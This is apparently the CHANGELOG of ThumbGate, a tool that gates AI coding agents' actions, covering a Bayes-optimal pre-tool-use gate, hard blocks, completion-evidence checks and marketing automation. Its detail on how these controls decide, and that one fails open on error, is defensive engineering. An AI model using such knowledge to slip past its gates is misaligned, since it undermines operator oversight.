- [#1273](https://github.com/IgorGanapolsky/ThumbGate/pull/1273) [`f8f9570`](https://github.com/IgorGanapolsky/ThumbGate/commit/f8f95700f85d0f33ec3f63b529f9f660bee19ef2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a managed-model candidate catalog and CLI planner so ThumbGate can rank and benchmark new providers like Tinker Kimi K2.6 and Qwen3.6 against real gate-eval, prompt-eval, and ThumbGate Bench workflows before routing production traffic.

- [#1125](https://github.com/IgorGanapolsky/ThumbGate/pull/1125) [`856b818`](https://github.com/IgorGanapolsky/ThumbGate/commit/856b81855de840b764226f0e5666bbc0114031b4) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add AI recommendation visibility guides for topical presence and relational knowledge, and update touched marketing links to use the landing site at usethumbgate.com.

- [#1277](https://github.com/IgorGanapolsky/ThumbGate/pull/1277) [`57a465f`](https://github.com/IgorGanapolsky/ThumbGate/commit/57a465f7c1972bf7ac2e574d708f5e48d627167e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(gates): harden GitHub Actions workflow dispatch decisions

  `gh workflow run` is now classified as a governed high-risk action. Decision evaluation requires workflow-dispatch evidence for environment, workflow file, ref, HEAD SHA, and expected job, blocks mismatches before execution, and returns deliberation/consistency-check instructions for high-risk actions.

  The public repository was also scrubbed of obsolete project-specific proof lanes and source comments so ThumbGate no longer carries unrelated customer/repo names in tracked files.

- [#1159](https://github.com/IgorGanapolsky/ThumbGate/pull/1159) [`6fd61b6`](https://github.com/IgorGanapolsky/ThumbGate/commit/6fd61b6633678dff2e00f8ee85a1c3afee3e0f97) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route LinkedIn and Threads publishing through Zernio when `ZERNIO_API_KEY` is
  set, collapsing three token rotations (LinkedIn, Threads, Bluesky) to a single
  Zernio OAuth bundle. Direct-API publishers remain the fallback when the key is
  absent and can be forced back on with `THUMBGATE_USE_DIRECT_PUBLISHERS=1`
  (emergency escape parallel to `THUMBGATE_USE_DIRECT_POLLERS=1` for analytics).
  Reddit, Instagram, YouTube, Dev.to, and TikTok stay on direct-API because
  Zernio cannot match their content shapes (subreddit+title, media, video,
  articles).

## 1.15.0

### Minor Changes

- [#1121](https://github.com/IgorGanapolsky/ThumbGate/pull/1121) [`bc32329`](https://github.com/IgorGanapolsky/ThumbGate/commit/bc32329f91efbeda0ea34ca5949ec918959489cf) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add one-shot integration bridge for [agent-architect-kit](https://github.com/ultrathink-art/agent-architect-kit) per-role memory directories.

  `scripts/integrations/architect-kit-memory-bridge.js` parses `agents/state/memory/<role>.md` files (Mistakes / Learnings / Stakeholder Feedback / Session Log sections) and emits ThumbGate feedback entries: Mistakes → thumbs-down with `whatWentWrong`, Learnings → thumbs-up with `whatWorked`, Stakeholder Feedback polarity-flipped on negative keywords, Session Log skipped. Every entry tagged `architect-kit` + `role:<name>` + source section for auditable rollback. Ingested entries flow through the standard lesson-DB / Thompson Sampling / prevention-rule pipeline, so architect-kit users can promote their markdown memory into PreToolUse-enforced hooks.

  CLI: `npm run integrations:architect-kit:import -- --dir=<path> [--role=<name>] [--dry-run] [--json]`.

  Also harvests six high-ROI patterns from architect-kit's annotated CLAUDE.md into a new _Hard-Won Lessons_ section (fix-on-fix signal, rapid-push batching, ZERO/ALWAYS behavioral thresholds, memory-instructions coupling, post-deploy-gate nuance, `require.main === module` path-resolve fix) each with an explicit `# WHY` tying to a specific incident class.

  Test coverage: 16 dependency-injected unit tests pinned into `npm test` via the test-suite parity guard.

- [#1100](https://github.com/IgorGanapolsky/ThumbGate/pull/1100) [`f3e40ca`](https://github.com/IgorGanapolsky/ThumbGate/commit/f3e40ca41ae8d28a2e3ead987826fb39657d889e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Expand the Bayes-optimal gate's loss matrix to 49 falseAllow tiers (self-protect, kill-gate, hooks-disable, db-drop-production, deploy-env-secret-exposure, mcp-sql-delete, supply-chain, network-egress, …) and 5 falseBlock tiers, so cost-weighted decisions cover the full blast-radius spectrum instead of bucketing everything under `default`.

  Add cross-session canonical-hash lesson dedup. `scripts/lesson-canonical.js` normalizes lessons via lowercase → punctuation strip → stop-word drop → trailing-s stem → sort → SHA-256, so two lessons that differ only in phrasing collapse to the same 16-hex hash. Wired into `captureFeedback` (stamps `canonicalHash` on each memory record), `findSimilarLesson` (canonical match short-circuits Jaccard with `matchType: 'canonical'`), and `lesson-db.findDuplicate` (canonical fallback when exact-text miss).

  Add a summarize-then-expand pack assembly strategy to ContextFS. Opt in via `summarizeThenExpand: true` / `strategy: 'summarize-then-expand'` on `constructContextPack`. Pass 1 reserves ~35% of `maxChars` for a wide roster of `title + one-line hint` summaries; pass 2 walks top-down upgrading to full `structuredContext` while the remaining budget can absorb the delta. Under tight budgets the pack surfaces more of the corpus (broad recall) while still spending depth on the top-ranked hits.

- [#1092](https://github.com/IgorGanapolsky/ThumbGate/pull/1092) [`a137117`](https://github.com/IgorGanapolsky/ThumbGate/commit/a1371178b285f0c9c2ea2a36a9054094e821c275) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(public): first-party numbers page + freshness markers for SEO 2026 trust signals

  Ships `/numbers` — a live first-party-data page rendered from the same local
  scripts that power the CLI (`scripts/gate-stats.js`, `scripts/token-savings.js`,
  `scripts/bayes-optimal-gate.js`). Every number links back to its source script
  so AI retrievers can cite with provenance.

  The page surfaces:

  - Active gates (manual + auto-promoted)
  - Actions blocked / warned
  - Top blocked gate + last promotion
  - Estimated hours saved, LLM dollars saved, tokens not spent
  - Bayes error rate of the intervention scorer

  JSON-LD includes `SoftwareApplication`, `Dataset` with `variableMeasured`
  PropertyValue entries, and stable `Person` authorship with `sameAs` links
  (GitHub, LinkedIn). Regenerate via `npm run numbers:generate`.

  Also stamps consistent authorship + visible `Updated:` markers +
  `dateModified` JSON-LD on five public pages that previously lacked them:
  `learn.html`, `lessons.html`, `codex-plugin.html`, `pro.html`,
  `dashboard.html`.

  Rationale: the 2026-04 SEJ "What Search Engines Trust Now" analysis ranks
  first-party data, freshness, and extractability as the signals most durable
  against AI-synthesis ambiguity. ThumbGate's operational metrics are unique —
  nobody else can fake "180 blocks last month" because they don't run the
  gates. Publishing them as schema-marked-up Dataset + SoftwareApplication on a
  page dated the same day it's regenerated hits all three signals at once.

  Regression guards: `tests/numbers-page.test.js` pins JSON-LD contract,
  authorship, source-link provenance, and freshness markers on all five pages.

- [#1103](https://github.com/IgorGanapolsky/ThumbGate/pull/1103) [`d7101d4`](https://github.com/IgorGanapolsky/ThumbGate/commit/d7101d4f709f7ac7cd6259ebb41537ec054c622c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a pre-promotion rule validator (scripts/rule-validator.js) that gates
  every auto-promoted prevention rule before it lands in
  synthesized-rules.jsonl. Inspired by the Autogenesis self-evolving agent
  protocol (arxiv 2604.15034): we already had capability-gap identification,
  candidate generation, and integration — this plugs the missing "validate
  before integrate" phase.

  A proposed rule is now promotable iff it fires on the seed lesson that
  triggered promotion AND its precision on recent overlapping-tag events
  clears a floor (default 0.8). Rules that fail either invariant are parked
  in a new rejected-rules.jsonl side log with a machine-readable reason
  (rule_does_not_match_seed_lesson, precision_below_floor,
  insufficient_sample, no_firings_in_sample, invalid_rule_shape) so
  operators can audit silent rejections. Thresholds are overridable; the
  validator is a pure function (no IO) and covered by 15 new tests.

### Patch Changes

- [#1118](https://github.com/IgorGanapolsky/ThumbGate/pull/1118) [`70adc79`](https://github.com/IgorGanapolsky/ThumbGate/commit/70adc79557c6ea68848edd8844f8c5443597c9a9) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route every outbound checkout link through the existing `/go/pro` tracked-link redirector and lock its behavior with tests.

  The `/go/:slug` redirector in `src/api/server.js` (`serveTrackedLinkRedirect`, line ~1305) already handled attribution — forwarding `utm_source`/`utm_medium`/`utm_campaign`/`utm_content` to `/checkout/:plan` and writing first-party telemetry via `buildTrackedLinkAttribution`. The problem was that README, SKILL docs, dashboard CTAs, postinstall banner, Reddit/dev.to autopilot posts, and `scripts/commercial-offer.js` all linked _directly_ at `https://buy.stripe.com/7sY...`, bypassing the redirector. Result: Plausible saw referrer but not campaign; Stripe saw conversions but not source; attribution was structurally impossible.

  Replaces the raw `buy.stripe.com` CTA across 10 surfaces with `https://thumbgate-production.up.railway.app/go/pro?utm_source=<channel>` (and `&utm_campaign=autopilot` on scheduled posts): three SKILL.md copies (`.agents/`, `.claude/`, `skills/`), `public/dashboard.html` (demo + live CTAs), `public/lessons.html`, `.github/workflows/marketing-autopilot.yml` (Reddit + dev.to posts), `scripts/ralph-mode-ci.js`, and `scripts/commercial-offer.js` (`PRO_MONTHLY_PAYMENT_LINK`).

  Adds three `tests/api-server.test.js` cases that pin the redirector's public contract: param-preserving 302 for `/go/pro?utm_source=…`, default attribution for bare `/go/pro`, and 404 JSON for unregistered slugs. Updates `tests/cli.test.js`, `tests/postinstall.test.js`, and `tests/thumbgate-skill.test.js` to match the new canonical URL surface.

- [#1126](https://github.com/IgorGanapolsky/ThumbGate/pull/1126) [`a75511c`](https://github.com/IgorGanapolsky/ThumbGate/commit/a75511c4fbaf91e42a09362d0cdcde067d7c9faa) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(social): never publish "blocked 0 mistakes, saving ~0 hours" stats posts

  When `getMeteredUsageSummary` returns zero blocks AND zero warnings AND zero active agents for the period, `generateWeeklyStatsPost` now sets `suppressed: true` with a human-readable `suppressedReason`. `scripts/weekly-auto-post.js` refuses to write the markdown file or call any publisher when suppressed. `scripts/social-post-hourly.js` routes the `stats` angle (and the default branch) through an evergreen fallback chain (`educational` / `hot-take` / `tip`) so the daily post cron never ships raw zero-stats text.

  Triggered by a 2026-04-21 CEO thumbs-down on a Bluesky post reading "This week ThumbGate blocked 0 mistakes, saving ~0 hours. Pre-action gates > post-mortem fixes." The two existing offending posts were deleted live via `com.atproto.repo.deleteRecord`; this patch prevents the pattern from ever publishing again and adds regression tests in `tests/metaclaw-features.test.js`, `tests/weekly-auto-post.test.js`, and `tests/social-post-hourly.test.js`.

- [#1115](https://github.com/IgorGanapolsky/ThumbGate/pull/1115) [`ddcbffd`](https://github.com/IgorGanapolsky/ThumbGate/commit/ddcbffdcc7254a00056c9fe4d27a0540ebdfa38c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Wire Bluesky reply monitoring into Ralph Loop (hourly CI) as a draft-only step.

  Zernio exposes no inbound/comments API as of 2026-04-21 (probed — `/inbox`, `/comments`, `/conversations`, `/messages`, `/dms`, `/threads`, `/engagements`, `/replies` all return 404 with HTML shell while `/accounts` returns 200 JSON). The Zernio Inbox add-on visible on the billing dashboard is a human-only surface. Reply monitoring for Bluesky therefore uses direct AT Protocol: `scripts/social-reply-monitor-bluesky.js` polls `app.bsky.notification.listNotifications` on the user's PDS and queues drafts to `.thumbgate/reply-drafts.jsonl`. The monitor never auto-posts — a draft-only posture was made mandatory after a CEO thumbs-down on AI-pitch reply voice.

  New `reply-monitor-bluesky` step in `scripts/ralph-loop.js` gated on `requiredEnvAll: ['BLUESKY_HANDLE','BLUESKY_APP_PASSWORD']`. Workflow env block in `.github/workflows/ralph-loop.yml` passes the new repo secrets. Tests in `tests/ralph-loop.test.js` pin the step list and skip-reason contract.

  Also ships two one-shot operator tools: `scripts/bluesky-list-actionable.js` dumps un-replied notifications for human triage, `scripts/bluesky-delete-replies.js` rolls back via `com.atproto.repo.deleteRecord`. The `skills/bluesky-engagement/SKILL.md` is the authoritative reference for credential rotation and the voice guardrail lesson.

- [#1123](https://github.com/IgorGanapolsky/ThumbGate/pull/1123) [`2c17f45`](https://github.com/IgorGanapolsky/ThumbGate/commit/2c17f45c76075d54ed09fca0198c8c2f27be73af) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the ThumbGate native messaging audit CLI and browser bridge safety guides for browser automation safety and native messaging host security.

- [#1119](https://github.com/IgorGanapolsky/ThumbGate/pull/1119) [`6e28801`](https://github.com/IgorGanapolsky/ThumbGate/commit/6e2880115ec815c374f3b86a314e22bb0dd44a4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Adopt Git 2.54 local config hooks for ThumbGate installs, keep older Git clients on `core.hooksPath`, and harden proof/test temp repos against ambient operator hooks.

- [#1119](https://github.com/IgorGanapolsky/ThumbGate/pull/1119) [`6e28801`](https://github.com/IgorGanapolsky/ThumbGate/commit/6e2880115ec815c374f3b86a314e22bb0dd44a4e) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(installer): harden git-hook-installer.js against SonarCloud quality-gate findings

  - Tighten hook file permissions from `0o755` to `0o700`. Git runs hooks as the
    same user that invoked the git command, so group/other execute bits served
    no purpose and only widened the attack surface (SonarCloud S2612).
  - Replace `require.main === module` with an explicit `isCliEntrypoint()` helper
    comparing `require.main.filename` against `__filename`. The strict-equality
    idiom tripped SonarCloud S3403 ("this check will always be false") under its
    TypeScript flow analyzer; the filename-based check has no such ambiguity and
    also makes the CLI-detection path unit-testable.
  - Document why `spawnSync('git', …)` is safe with a NOSONAR annotation
    (S4036 hotspot review). The installer must honor the developer's PATH
    because git ships from a dozen different locations (brew, apt, scoop,
    Xcode, Git-for-Windows); args is always an array, so no shell interpolation
    risk; and the command literal is hard-coded, not user-supplied.

  Adds regression tests covering the new owner-only permission bits and the
  new `isCliEntrypoint` helper.

- [#1105](https://github.com/IgorGanapolsky/ThumbGate/pull/1105) [`56370d5`](https://github.com/IgorGanapolsky/ThumbGate/commit/56370d53731e1890cff5a1b4ff54ad9bd4e6bc09) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Hard-block destructive local shell actions in default gates and render CLI thumbs-down feedback with the correct label.

- [#1106](https://github.com/IgorGanapolsky/ThumbGate/pull/1106) [`9843fdc`](https://github.com/IgorGanapolsky/ThumbGate/commit/9843fdc4fe13927a1d9dd2ef4654fc558f32bde1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add the ThumbGate harness optimization audit CLI and a proof-linked SEO guide for AI agent harness optimization.

- [#1004](https://github.com/IgorGanapolsky/ThumbGate/pull/1004) [`e7dc1c6`](https://github.com/IgorGanapolsky/ThumbGate/commit/e7dc1c626e63fe64c636e0b2426a86ade18fabc1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Route `main`-targeting PR manager merges through `/trunk merge` comments so autonomous merge requests work under Enterprise Managed User accounts without falling back to blocked GraphQL merge mutations.

- [#1095](https://github.com/IgorGanapolsky/ThumbGate/pull/1095) [`78b45f5`](https://github.com/IgorGanapolsky/ThumbGate/commit/78b45f511005a764ce164c8fb81d1095786ffc6a) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Pin the runtime protobuf dependency to a patched release so clean ThumbGate installs avoid the protobufjs critical advisory.

- [#1111](https://github.com/IgorGanapolsky/ThumbGate/pull/1111) [`fa777d1`](https://github.com/IgorGanapolsky/ThumbGate/commit/fa777d1a84ae769fb4610c1f4034d3a5f88d492f) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - fix(social): route social CTAs through tracked landing page

  404 posts published via Zernio over the last 30 days produced 0 rows in
  `.claude/memory/feedback/funnel-events.jsonl` because every post CTA
  linked to `github.com/IgorGanapolsky/ThumbGate`, which never touches the
  funnel tracker. Attribution blindness: 4 lifetime installs across 404
  posts was the result.

  Primary CTA in every Zernio-published angle/caption now routes through
  `https://thumbgate-production.up.railway.app/numbers`. `tagUrlsInText`
  auto-injects `utm_source=zernio&utm_medium=social&utm_campaign=organic`
  because the landing domain is already in `TRACKABLE_DOMAINS`. GitHub is
  retained as a secondary "Source (MIT)" reference for credibility.

  Covers:

  - `scripts/social-post-hourly.js` — daily LinkedIn/X poster, 7 content
    angles. `horror-story`, `tip`, `product-demo` now lead with the
    tracked landing URL.
  - `scripts/social-analytics/post-video.js` — TikTok/YouTube/Instagram
    captions. TikTok and YouTube now lead with the tracked landing URL;
    Instagram unchanged (uses "link in bio" — no inline URLs).

  Regression guards in `tests/social-post-hourly.test.js` and
  `tests/post-video.test.js` fail if any angle/caption regresses to a
  github-only CTA.

  Also wires the `/numbers` handler in `src/api/server.js` through
  `servePublicMarketingPage` so the `landing_page_view` telemetry and a
  `discovery/landing_view` entry in `funnel-events.jsonl` are both
  captured with the UTM metadata attached to the inbound request. Before
  this wire, `/numbers` views wrote only to `telemetry-pings.jsonl`
  (invisible to `npm run feedback:summary` and `bin/cli.js cfo --today`),
  leaving the funnel ledger empty despite 404 published Zernio posts.
  Other marketing pages (`/`, `/dashboard`) already routed through
  `servePublicMarketingPage` and now automatically inherit the
  funnel-ledger write as well.

- [#1102](https://github.com/IgorGanapolsky/ThumbGate/pull/1102) [`186caf5`](https://github.com/IgorGanapolsky/ThumbGate/commit/186caf5caf845ab94c068d70f2032ba08707f1fa) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Accept the Socket Security Pull Request Alerts context in branch-protection congruence checks.

## 1.14.0

### Minor Changes

- [#1093](https://github.com/IgorGanapolsky/ThumbGate/pull/1093) [`f0453e4`](https://github.com/IgorGanapolsky/ThumbGate/commit/f0453e45a4a2052d16322509b9941fe768997dd1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add decision-ready operator artifact pulses for PR health, Reliability Gateway state, revenue prioritization, and release readiness.

  The new `thumbgate artifacts` CLI command and `generate_operator_artifact` MCP tool expose typed JSON or Markdown summaries so agents can progressively load high-level decisions instead of stitching together low-level telemetry calls.

### Patch Changes

- [#979](https://github.com/IgorGanapolsky/ThumbGate/pull/979) [`0f56b0d`](https://github.com/IgorGanapolsky/ThumbGate/commit/0f56b0d508dbd0701d002df9e6feabafbb3a1a65) Thanks [@dependabot](https://github.com/apps/dependabot)! - Add the release note required for the `@huggingface/transformers` 4.1.0 dependency bump so manifest-only Dependabot updates pass ThumbGate's release hygiene checks.

## 1.13.0

### Minor Changes

- [#1059](https://github.com/IgorGanapolsky/ThumbGate/pull/1059) [`095cb8c`](https://github.com/IgorGanapolsky/ThumbGate/commit/095cb8c289546ccf7a957664d8d01c64ccd07aa3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - feat(analytics): Zernio as canonical social stack; trim direct-API pollers to opt-in fallback

  `scripts/social-analytics/poll-all.js` now runs only `github + plausible + zernio`
  by default. The seven direct-API pollers (reddit, linkedin, x, threads,
  instagram, youtube, tiktok) move to a `LEGACY_POLLERS` list that activates
  only when `THUMBGATE_USE_DIRECT_POLLERS=1`.

  Adds `scripts/social-analytics/zernio-status.js` (npm run `social:zernio:status`)
  which reads the local `engagement_metrics` SQLite table, reports per-platform
  row counts for the last 24h, and exits non-zero when zero rows ingested —
  making silent Zernio 402 / auth / rate-limit failures CEO-visible.

  Zernio holds the OAuth connections for every focus channel, so maintaining
  eight separate token rotations + direct pollers was duplicate infrastructure
  that silently skipped on missing env for months. The emergency fallback flag
  preserves the old behavior without making it the default contract.

### Patch Changes

- Ship the Zernio social analytics runtime scripts in a new npm package version so main does not silently skip publish verification after analytics changes.

## 1.12.2

### Patch Changes

- [#998](https://github.com/IgorGanapolsky/ThumbGate/pull/998) [`a4bb1f3`](https://github.com/IgorGanapolsky/ThumbGate/commit/a4bb1f3e82a429cec98d4ff9ed4bafa083467847) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Ship all static MCP startup dependencies in the npm package so `thumbgate serve` does not crash with a closed transport.

## 1.12.1

### Patch Changes

- [#990](https://github.com/IgorGanapolsky/ThumbGate/pull/990) [`6698e44`](https://github.com/IgorGanapolsky/ThumbGate/commit/6698e449d4e234b22bd6c772eba70b090237c5ce) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a structural local-only gate that blocks remote git, PR, release, and publish actions before configurable gate evaluation.

  Update published Claude Code MCP installers to resolve `thumbgate@latest` without reusing stale installed runtime binaries.

- [#980](https://github.com/IgorGanapolsky/ThumbGate/pull/980) [`81f81b4`](https://github.com/IgorGanapolsky/ThumbGate/commit/81f81b48a5cc3bfc66bd91e576c3f34fad7e86db) Thanks [@dependabot](https://github.com/apps/dependabot)! - Add the release note required for the `@anthropic-ai/sdk` 0.90.0 dependency bump so manifest-only Dependabot updates pass ThumbGate's release hygiene checks.

- [#978](https://github.com/IgorGanapolsky/ThumbGate/pull/978) [`ff75751`](https://github.com/IgorGanapolsky/ThumbGate/commit/ff757516701c38d884c77bad7d535e7e29030f0b) Thanks [@dependabot](https://github.com/apps/dependabot)! - Add the release note required for the `stripe` 22.0.2 dependency bump so manifest-only Dependabot updates pass ThumbGate's release hygiene checks.

## 1.12.0

### Minor Changes

- [#991](https://github.com/IgorGanapolsky/ThumbGate/pull/991) [`f6525ef`](https://github.com/IgorGanapolsky/ThumbGate/commit/f6525efb73d1dc05682c06ef3b1f642132c67ca2) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Drop X/Twitter from the active distribution loop and consolidate on six focus channels: Reddit, LinkedIn, Threads, Bluesky, Instagram, YouTube. `scripts/post-everywhere.js` now exports a frozen `DEFAULT_PLATFORMS` list with dispatchers for each channel; Threads and Bluesky route through the Zernio aggregator. Marketing-autopilot, reply-monitor, weekly-social-post, Ralph mode/loop, social-engagement-hourly, GTM autonomous loop, daily revenue loop, and social-analytics workflows no longer reference X/Twitter secrets or fallback posters. `tests/post-everywhere-channels.test.js` pins the new focus list and rejects X/Twitter regressions. Legacy `scripts/post-to-x*.js` modules remain on disk for manual ad-hoc use only.

## 1.11.1

### Patch Changes

- [#993](https://github.com/IgorGanapolsky/ThumbGate/pull/993) [`e2a1af1`](https://github.com/IgorGanapolsky/ThumbGate/commit/e2a1af1a296d62744eac746ca8acaba7cd8d1c94) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Repair stale Codex hook/statusline wiring automatically when the ThumbGate Codex MCP server starts, and cover the legacy two-hook config shape with regression tests.

- [#985](https://github.com/IgorGanapolsky/ThumbGate/pull/985) [`d11547a`](https://github.com/IgorGanapolsky/ThumbGate/commit/d11547a4393fc438ba1448561e560927f4ca530c) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Automate Dependabot release hygiene by generating changesets for manifest-only dependency PRs and skipping branch-protection or SonarCloud checks that bot tokens cannot satisfy.

- [#976](https://github.com/IgorGanapolsky/ThumbGate/pull/976) [`0e3153a`](https://github.com/IgorGanapolsky/ThumbGate/commit/0e3153ad80cad311ecf7f810bba12c19ed946321) Thanks [@dependabot](https://github.com/apps/dependabot)! - Add the release note required for the `@changesets/cli` 2.31.0 dependency bump so manifest-only Dependabot updates pass ThumbGate's release hygiene checks.

## 1.11.0

### Minor Changes

- [#986](https://github.com/IgorGanapolsky/ThumbGate/pull/986) [`3b4dabf`](https://github.com/IgorGanapolsky/ThumbGate/commit/3b4dabfe777f0b034499609ced20c0eb98f7a362) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add a context footprint optimizer for MCP agents, including a read-only `plan_context_footprint` tool and a public `.well-known/mcp/footprint.json` report that quantifies progressive schema-loading savings.

## 1.10.1

### Patch Changes

- [#961](https://github.com/IgorGanapolsky/ThumbGate/pull/961) [`7149291`](https://github.com/IgorGanapolsky/ThumbGate/commit/714929162a9a2886f6df3a8c9c977596e7f8a6b1) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Fix mailer sender-DNS regex to match Resend's actual SES MX host (`amazonses.com`, not `amazonaws.com`), and add granular unit tests for `hasResendSenderDns`, `resolveSenderAddress`, `recordsHaveResendDns`, and the 10-minute `senderDnsCache` TTL. The regex bug meant the positive branch of sender-domain verification never matched in production — every send through a custom domain fell back to `onboarding@resend.dev` even after DNS was correctly configured.

## 1.10.0

### Minor Changes

- [#963](https://github.com/IgorGanapolsky/ThumbGate/pull/963) [`289fc4f`](https://github.com/IgorGanapolsky/ThumbGate/commit/289fc4f27ce36ce7300381b65b39cd919c8fe002) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add Bayes-optimal decision layer for the pre-tool-use gate. The legacy gate blocks when any matched lesson tag has a heuristic risk score ≥ a single global threshold — a "threshold-on-heuristic" rule that cannot express asymmetric misclassification costs (e.g., false-allowing a `deploy-prod`-tagged call is orders of magnitude more expensive than false-blocking a lint fix). The new layer computes `P(harmful | tags)` via a clipped Bayes-factor update over the trained scorer's probability and per-tag empirical risk rates, then picks the action that minimizes expected loss under a configurable loss matrix. The gate also now exposes a Bayes-error-rate metric (the irreducible floor of the current feature set) on `gate-stats` — a stopping rule for threshold tuning. The decision path is opt-in via `THUMBGATE_HOOKS_BAYES_OPTIMAL=1` or `bayesOptimalEnabled: true` in `config/enforcement.json`, and fails open back to the legacy rule on any error. Thompson Sampling gains an `argmaxPosteriors` + `pickBestCategory` exploit-mode counterpart to `samplePosteriors` for hot-path selection without exploration noise.

- [#960](https://github.com/IgorGanapolsky/ThumbGate/pull/960) [`b479da1`](https://github.com/IgorGanapolsky/ThumbGate/commit/b479da1964a32b461589be1d45c7d960e1dbe6c3) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Add high-ROI MCP agent-discovery and research-loop surfaces.

  - Publish progressive MCP discovery manifests under `.well-known/mcp`, including a compact tool index, per-tool schema URLs, skill manifests, and application manifests so AI agents and crawlers can load ThumbGate without stuffing every tool into context.
  - Add `run_autoresearch` as a bounded MCP tool for Shopify-style baseline, hypothesis, holdout, and keep/discard loops around revenue and reliability metrics.
  - Add `plan_multimodal_retrieval` so operators can plan screenshot, PDF, dashboard, and proof-artifact retrieval using multimodal sentence-transformer guidance, Matryoshka-style dimensions, reranker metrics, and hard-negative holdouts before spending GPU time.

## 1.9.0

### Minor Changes

- [#957](https://github.com/IgorGanapolsky/ThumbGate/pull/957) [`68b3de3`](https://github.com/IgorGanapolsky/ThumbGate/commit/68b3de3c00ec861ee5709e5667535f6f6ddd2586) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Agentic-engineering Leader Agent endpoints: completion gate, swarm coordinator, and unified observability.

  Adds three MCP tools that lift ThumbGate from a bag of primitives into a Leader-Agent coordination layer (per the LangChain agentic-engineering framing — worker agents consume, leader endpoints coordinate and verify):

  - `require_evidence_for_claim` — completion gate. Wraps `verifyClaimEvidence` with a first-class `blocking` boolean and mode (`blocking` default, `advisory`). Records the decision to the audit trail under `gateId: completion_claim`. Agents call this before declaring done/fixed/shipped; hooks honor the blocking flag to stop evidence-free completion claims.
  - `distribute_context_to_agents` — swarm coordinator. Constructs one context pack via `constructContextPack` and records a `context_pack_distributed` provenance event per named agent (dedup'd, capped at `MAX_AGENTS=32`, TTL defaults to 15 minutes). Replaces N independent context derivations by auto-agents (perplexity-bug-resolver, codex-reviewer, grok-x-intelligence, etc.) with one shared pack.
  - `session_report` — unified observability rollup. Aggregates feedback stats, gate stats, and windowed provenance into a single LangSmith-style report. `windowHours` clamps to `[1, 720]`; invalid/missing input falls back to the 24h default. Errors in any section are isolated via a per-section `errors` map so one broken source doesn't sink the report.

  Exposed in `default`, `essential`, `readonly`, and `dispatch` MCP profiles. No OpenAPI surface changes (MCP-only). Ships with 24 new tests across `tests/swarm-coordinator.test.js`, `tests/session-report.test.js`, and `tests/require-evidence-gate.test.js`; regression runs clean across `test:api` (834), `test:gates` (198), `test:tool-registry` (11), `test:proof` (96), `test:deployment` (55), `test:e2e` (29), `test:workflow` (98), `test:schema` (8), and `test:mcp-config` (9).

### Patch Changes

- [#925](https://github.com/IgorGanapolsky/ThumbGate/pull/925) [`e0c89bc`](https://github.com/IgorGanapolsky/ThumbGate/commit/e0c89bc4015bf37e6eb23aefdc9146fde1858304) Thanks [@dependabot](https://github.com/apps/dependabot)! - Bump transitive dependency `protobufjs` from 7.5.4 to 7.5.5 (security/bugfix release). Lockfile-only change via Dependabot.

- [#947](https://github.com/IgorGanapolsky/ThumbGate/pull/947) [`b326963`](https://github.com/IgorGanapolsky/ThumbGate/commit/b3269631fcfdf2093a5c0a12ad6f331ce0b053b5) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Mailer module now accepts `THUMBGATE_RESEND_API_KEY` as a fallback for the bare `RESEND_API_KEY`, matching the dual-read behavior already implemented in `scripts/billing.js`. Prevents a silent "skipped: no_api_key" regression if an operator sets only the prefixed variable name. Adds a positive unit test that sends with only the prefixed variant set.

- Fix repo bootstrap so worktree checkouts can create local MCP wiring and info exclude entries without failing on `.git` pointer files.

## 1.8.0

### Minor Changes

- [#954](https://github.com/IgorGanapolsky/ThumbGate/pull/954) [`d48608e`](https://github.com/IgorGanapolsky/ThumbGate/commit/d48608ea2f7956aa4d513878b8d5e7d82596f213) Thanks [@IgorGanapolsky](https://github.com/IgorGanapolsky)! - Enforcement teeth: move ThumbGate's PreToolUse path from advisory to preventive.

  - `capture_feedback` now surfaces `correctiveActions` as a top-level `<system-reminder>` block in the MCP response (content[1]) alongside the JSON body (content[0]), so prior lessons reach the calling agent as first-class context instead of buried JSON.
